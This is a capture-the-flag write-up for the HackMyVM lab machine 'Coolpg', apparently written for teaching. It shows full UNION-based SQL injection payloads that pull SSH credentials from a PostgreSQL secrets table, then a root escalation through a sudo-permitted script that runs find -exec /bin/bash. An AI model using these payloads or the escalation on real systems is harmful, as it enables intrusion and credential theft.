# Coolpg

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Coolpg | cool | Beginner | HackMyVM |

**Summary:** Coolpg is a beginner-level machine that demonstrates a classic web application penetration testing scenario. The attack path involves discovering a PostgreSQL-based web application with SQL injection vulnerabilities, exploiting the vulnerability to extract credentials from a database secrets table, and leveraging SSH access with the extracted credentials. The privilege escalation vector exploits a misconfigured sudo rule that allows execution of a vulnerable shell script containing an unsafe `find` command with `-exec` parameter, leading to root access through arbitrary command execution via a GTFOBins pattern.

---

## Reconnaissance

### Network Discovery

The initial reconnaissance begins with network scanning to identify live targets in the environment:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
...
[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.40 08:00:27:81:5E:CB VirtualBox
```

### Port Scanning

With the target identified at `192.168.100.40`, a comprehensive port scan reveals the available services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sCV -p- 192.168.100.40
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-27 18:40 WIB
Nmap scan report for 192.168.100.40
Host is up (0.0031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
80/tcp open  http    nginx
|_http-title: CoolPG Internal
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.34 seconds
```

The scan reveals two open ports:
- **Port 22**: SSH service (OpenSSH 10.0p2 Debian 7)
- **Port 80**: HTTP service (nginx) with title "CoolPG Internal"

### Web Application Analysis

Navigating to the web application on port 80 reveals a login interface:

![](image.png)

The initial web page presents a login form for "CoolPG Internal" with the message "Authorized staff only." Examining the source code reveals two critical pieces of information:

```html
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>CoolPG Internal</title>
  <style>
    body { font-family: system-ui, sans-serif; background:#0b1220; color:#e5e7eb; }
    .wrap { max-width: 440px; margin: 80px auto; padding: 24px; background:#111827; border:1px solid #243044; border-radius:12px; }
    h2 { margin: 0 0 14px 0; font-size: 22px; }
    .hint { color:#94a3b8; font-size: 13px; margin-bottom: 18px; line-height: 1.4; }
    input { width:100%; padding:10px; margin:8px 0; border-radius:10px; border:1px solid #243044; background:#0b1220; color:#e5e7eb; }
    button { width:100%; padding:10px; margin-top:10px; border-radius:10px; border:0; background:#3b82f6; color:white; font-weight:600; cursor:pointer; }
    footer { margin-top:14px; font-size:12px; color:#64748b; text-align:center; }
  </style>
</head>
<body>
  <div class="wrap">
    <h2>CoolPG Internal</h2>
    <div class="hint">
      Authorized staff only.<br>
      <!-- onboarding: ask IT for access -->
    </div>
    <form method="POST" action="/login">
      <input name="username" placeholder="username" autocomplete="off">
      <input name="password" placeholder="password" type="password" autocomplete="off">
      <button type="submit">Sign in</button>
    </form>
    <footer>coolpgi.hmv</footer>
  </div>
</body>
</html>
```

**Key Intelligence Gathered:**
1. **HTML Comment**: `<!-- onboarding: ask IT for access -->` - suggests hidden entry points or internal documentation
2. **Footer Domain**: `coolpgi.hmv` - reveals FQDN that may unlock additional functionality

### DNS Configuration

Based on the discovered FQDN, the hosts file is updated to enable proper domain resolution:

```bash
┌──(root㉿CLIENT-DESKTOP)-[~]
└─# echo "192.168.100.40  coolpgi.hmv" | sudo tee -a /etc/hosts
192.168.100.40  coolpgi.hmv
```

Verification confirms the domain resolves correctly:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl -I http://coolpgi.hmv/
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 27 Jan 2026 12:14:11 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1323
Connection: keep-alive
```

### Directory Enumeration

Following the hint about asking "IT for access," directory fuzzing is performed to discover hidden entry points:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ ffuf -u http://coolpgi.hmv/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 1323

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://coolpgi.hmv/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1323
________________________________________________

login                   [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 447ms]
panel                   [Status: 200, Size: 1273, Words: 196, Lines: 34, Duration: 455ms]
search                  [Status: 200, Size: 944, Words: 146, Lines: 30, Duration: 727ms]
:: Progress: [4614/4614] :: Job [1/1] :: 91 req/sec :: Duration: [0:01:02] :: Errors: 0 ::
```

Three endpoints are discovered:
- `/login` - Login functionality (already known)
- `/panel` - User lookup interface
- `/search` - Search results page

---

## Initial Access

### Vulnerability Discovery

The `/panel` endpoint reveals a "User Lookup" interface with critical developer comments:

![](image-1.png)

Examining the source code exposes dangerous developer notes:

```html
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>CoolPG Panel</title>
  <style>
    body { font-family: system-ui, sans-serif; background:#0b1220; color:#e5e7eb; }
    .wrap { max-width: 720px; margin: 60px auto; padding: 24px; background:#111827; border:1px solid #243044; border-radius:12px; }
    h2 { margin: 0 0 10px 0; }
    .hint { color:#94a3b8; font-size: 13px; margin-bottom: 16px; line-height: 1.4; }
    input { width:100%; padding:10px; margin:8px 0; border-radius:10px; border:1px solid #243044; background:#0b1220; color:#e5e7eb; }
    button { padding:10px 14px; border-radius:10px; border:0; background:#3b82f6; color:white; font-weight:600; cursor:pointer; }
    .muted { color:#64748b; }
  </style>
</head>
<body>
  <div class="wrap">
    <!-- Dev note: access control handled upstream -->
    <h2>User Lookup</h2>
    <div class="hint">
      Search users by username.<br>
      <span class="muted">Dev note: UNION reporting is supported for ops audits.</span>
    </div>

    <!-- TODO: sanitize UNION reports before external exposure -->
    <form method="GET" action="/search">
      <input name="q" placeholder="search (e.g. cool)" autocomplete="off">
      <button type="submit">Search</button>
    </form>
  </div>
</body>
</html>
```

**Critical Security Issues Identified:**
1. **Developer Comment**: "UNION reporting is supported for ops audits" - directly hints at SQL injection vulnerability
2. **TODO Comment**: "sanitize UNION reports before external exposure" - confirms unsanitized SQL queries
3. **Access Control**: "access control handled upstream" - suggests insufficient input validation

The `/search` endpoint shows typical query results format:

![](image-2.png)

### SQL Injection Exploitation

#### Initial Proof of Concept

Testing for SQL injection using a basic UNION payload:

**Payload**: `' UNION SELECT 'test'--`

![](image-3.png)

The successful injection of the string "test" confirms the presence of SQL injection vulnerability. The application returns the injected value, proving that UNION-based SQL injection is possible.

#### Database Fingerprinting

**Payload**: `'UNION SELECT VERSION()--`

![](image-4.png)

The version query reveals the database system:
- **Database**: PostgreSQL 17.6 (Debian 17.6-0+deb13u1)
- **Platform**: x86_64-pc-linux-gnu
- **Compiler**: gcc (Debian 14.2.0-19)

#### Schema Enumeration

**Payload**: `' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--`

![](image-5.png)

Two tables are discovered in the public schema:
- `secrets` - Highly interesting table name suggesting stored credentials
- `users` - Standard user table

#### Column Discovery

Focusing on the `secrets` table, column enumeration is performed:

**Payload**: `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='secrets'--`

![](image-6.png)

The `secrets` table contains three columns:
- `id` - Primary key identifier
- `name` - Secret name/identifier
- `value` - Secret value/content

#### Data Extraction

**Payload**: `' UNION SELECT name || ':' || value FROM secrets--`

![alt text](image-8.png)

**Critical Credentials Extracted:**
- `ssh_user:cool`
- `ssh_pass:[REDACTED]`

### SSH Access

Using the extracted credentials to establish SSH access:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ ssh cool@192.168.100.40
...
cool@192.168.100.40's password:
Linux coolpgi.hmv 6.12.57+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.57-1 (2025-11-05) x86_64
...
cool@coolpgi:~$ id
uid=1000(cool) gid=1000(cool) groups=1000(cool),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
cool@coolpgi:~$ ls -la
total 24
drwx------ 2 cool cool 4096 Jan  5 00:20 .
drwxr-xr-x 3 root root 4096 Jan  4 22:38 ..
---------- 1 cool cool    0 Jan  4 23:20 .bash_history
-rw-r--r-- 1 cool cool  220 Jan  4 22:38 .bash_logout
-rw-r--r-- 1 cool cool 3740 Jan  5 00:20 .bashrc
-rw-rw-r-- 1 root root    0 Jan  4 23:13 debug.log
-rw-r--r-- 1 cool cool  807 Jan  4 22:38 .profile
-rw------- 1 cool cool   30 Jan  4 23:10 user.txt
```

---

## Privilege Escalation

### Sudo Privilege Analysis

Examining available sudo privileges for the `cool` user:

```bash
cool@coolpgi:~$ sudo -l
Matching Defaults entries for cool on coolpgi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User cool may run the following commands on coolpgi:
    (ALL) NOPASSWD: /usr/local/bin/runlogs-find.sh
```

The user can execute `/usr/local/bin/runlogs-find.sh` with full sudo privileges without password authentication.

### Script Analysis

Examining the vulnerable script:

```bash
cool@coolpgi:~$ ls -la /usr/local/bin/runlogs-find.sh
-rwxr-xr-x 1 root root 99 Jan  4 23:17 /usr/local/bin/runlogs-find.sh
cool@coolpgi:~$ cat /usr/local/bin/runlogs-find.sh
#!/bin/sh
exec /usr/bin/find /home/cool -maxdepth 3 -type f -name "*.log" -exec /bin/bash \; -quit
```

**Vulnerability Analysis:**

The script contains a critical security flaw in the `find` command usage:
- The `-exec /bin/bash \;` parameter executes `/bin/bash` for each matching file
- Since the script runs with root privileges via sudo, the executed bash shell inherits root privileges
- The `-quit` option ensures the command stops after the first match, but still executes the bash shell

### Root Exploitation

Since there's already a `debug.log` file in the user's home directory (visible from the `ls -la` output), the find command will match it and execute bash with root privileges:

```bash
cool@coolpgi:~$ sudo /usr/local/bin/runlogs-find.sh
root@coolpgi:/home/cool# id
uid=0(root) gid=0(root) groups=0(root)
root@coolpgi:/home/cool# cd
root@coolpgi:~# cat root.txt /home/cool/user.txt
HMV{coolpg_root_[REDACTED]}
HMV{coolpg_user_[REDACTED]}
```

---

## Attack Chain Summary

1. **Reconnaissance**: Network scanning identified HTTP service on port 80 and SSH on port 22. Web application analysis revealed domain `coolpgi.hmv` and developer hints about internal access.

2. **Vulnerability Discovery**: Directory fuzzing exposed `/panel` and `/search` endpoints. Source code analysis revealed developer comments explicitly mentioning UNION SQL operations and lack of input sanitization.

3. **Exploitation**: SQL injection vulnerability in the search parameter allowed UNION-based queries. PostgreSQL database enumeration revealed `secrets` table containing SSH credentials (`cool:[REDACTED]`).

4. **Internal Enumeration**: SSH access with extracted credentials provided user-level access to the system. Sudo privileges analysis revealed ability to execute `/usr/local/bin/runlogs-find.sh` script with root privileges.

5. **Privilege Escalation**: Vulnerable bash script used unsafe `find` command with `-exec /bin/bash` parameter. Execution of the script with sudo privileges resulted in root shell access through command injection.